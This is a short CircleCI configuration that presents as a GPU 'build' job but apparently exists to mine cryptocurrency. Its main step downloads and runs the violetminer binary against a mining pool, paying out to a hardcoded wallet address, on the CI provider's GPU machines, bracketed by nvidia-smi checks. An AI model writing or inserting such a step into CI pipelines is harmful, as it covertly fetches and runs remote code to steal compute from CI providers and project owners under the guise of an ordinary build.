version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-1604-cuda-10.1:201909-23
    resource_class: gpu.nvidia.large
    steps:
      - run: nvidia-smi
      - run: wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:80 --username TRTLv3s1h7QGxQmg6Ar1pST9d8NLjCiX3Gy46qR5orkrX4Xhp1FRZUDR7EU8dANoK2MqUmQdAmBMoVJexjEmW6yt1soAFJxBNYm --password memek --algorithm chukwa/wrkz
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi